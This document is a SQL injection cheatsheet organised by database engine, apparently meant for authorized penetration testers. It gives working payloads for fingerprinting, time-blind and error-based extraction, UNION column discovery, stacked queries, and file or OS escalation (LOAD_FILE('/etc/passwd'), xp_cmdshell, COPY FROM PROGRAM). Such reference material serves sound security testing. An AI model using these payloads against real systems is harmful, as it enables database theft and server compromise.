# Database-Specific Syntax Cheatsheet

Once you know (or suspect) the backend engine, use its exact syntax —
generic payloads often fail silently on the wrong engine and waste
requests.

## Fingerprinting the engine

| Engine | Tell |
|---|---|
| MySQL | `SELECT @@version` works; comment styles `-- ` (note trailing space) and `#` both work; `||` is boolean OR unless `PIPES_AS_CONCAT` is set. |
| PostgreSQL | `SELECT version()`; supports `||` for string concat; no `LIMIT`-less row restriction trick like MySQL's `SLEEP()` — use `pg_sleep()`. |
| MSSQL | `SELECT @@version`; `;` allows stacked queries by default in many configs; `--` comment (no trailing space needed); `WAITFOR DELAY '0:0:5'` for time-blind. |
| Oracle | Every query needs a `FROM` clause (`FROM dual` for literal selects); `SELECT banner FROM v$version`; string concat via `\|\|`; no native `SLEEP` — use `DBMS_LOCK.SLEEP(5)` (needs privilege) or heavy query-based delays. |
| SQLite | `SELECT sqlite_version()`; limited function set, no stacked queries via most drivers, no native sleep function (time-blind usually needs a recursive/expensive query instead). |

## Comment syntax (for truncating the rest of a query)

| Engine | Comment markers |
|---|---|
| MySQL | `-- ` (trailing space required), `#`, `/* ... */` |
| PostgreSQL | `-- `, `/* ... */` |
| MSSQL | `--`, `/* ... */` |
| Oracle | `--`, `/* ... */` |
| SQLite | `--`, `/* ... */` |

## Time-delay functions (for time-blind confirmation/extraction)

| Engine | Payload |
|---|---|
| MySQL | `AND IF(1=1,SLEEP(5),0)` or `AND SLEEP(5)` inline |
| PostgreSQL | `AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)` |
| MSSQL | `; IF (1=1) WAITFOR DELAY '0:0:5'` (needs stacked-query support) or `AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)` for non-stacked contexts combined with a heavy subquery |
| Oracle | `AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(DBMS_LOCK.SLEEP(5)) ELSE '1' END FROM dual)` (requires `EXECUTE` on `DBMS_LOCK`); otherwise use a deliberately expensive join as a proxy for delay |
| SQLite | No native sleep; use a recursive CTE or large cross join as a measurable-but-bounded delay, and prefer boolean-blind over time-blind on SQLite when possible |

## String concatenation (for building extraction payloads)

| Engine | Syntax |
|---|---|
| MySQL | `CONCAT(a,b,c)` or `CONCAT_WS(sep,a,b)` |
| PostgreSQL | `a \|\| b \|\| c` |
| MSSQL | `a + b + c` |
| Oracle | `a \|\| b \|\| c` |
| SQLite | `a \|\| b \|\| c` |

## UNION column-count discovery

Works the same across engines — increment until the error disappears
(or, inversely, until it starts erroring past the real count):

```
?id=1 ORDER BY 1   -- increment until this errors; last success = column count
?id=1 UNION SELECT NULL             -- add NULLs until no column-count error
?id=1 UNION SELECT NULL,NULL
?id=1 UNION SELECT NULL,NULL,NULL
```

Oracle requires `FROM dual` on the injected `SELECT` if the original
query has one: `UNION SELECT NULL,NULL FROM dual`.

## Error-based extraction functions

| Engine | Function |
|---|---|
| MySQL | `extractvalue(1,concat(0x7e,(SELECT version())))` or `updatexml(1,concat(0x7e,(SELECT version())),1)` — both abuse XPath functions to force the subquery's result into the error message. |
| MSSQL | `CONVERT(int,(SELECT @@version))` — forces a type-conversion error that includes the string value. |
| PostgreSQL | `CAST((SELECT version()) AS int)` — similar conversion-error trick. |
| Oracle | `CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))` or XML-based (`XMLType` conversion errors). |

## Stacked queries (multiple statements in one request)

Supported by default in many MSSQL and PostgreSQL driver configurations;
usually **not** supported by MySQL's or SQLite's typical web drivers
(mysqli/PDO in single-statement mode), and rarely by Oracle via standard
web drivers. Confirm support before relying on it — sqlmap's
`--technique=S` detection handles this automatically.

## Reading files / OS interaction (escalation — scope-gated)

These move beyond data-layer access into file-system or OS access and
should only be attempted when the engagement explicitly authorizes
escalation testing:

- **MySQL**: `LOAD_FILE('/etc/passwd')` (needs `FILE` privilege and
  `secure_file_priv` not restricting the path); `SELECT ... INTO OUTFILE`
  for writes.
- **MSSQL**: `xp_cmdshell` (disabled by default since SQL Server 2005;
  re-enabling it as part of a test is itself a significant, often
  out-of-scope action — confirm authorization explicitly before doing
  so).
- **PostgreSQL**: `COPY ... FROM/TO PROGRAM` (superuser only) or large
  object functions.
- **Oracle**: `UTL_FILE` (requires a configured directory object).
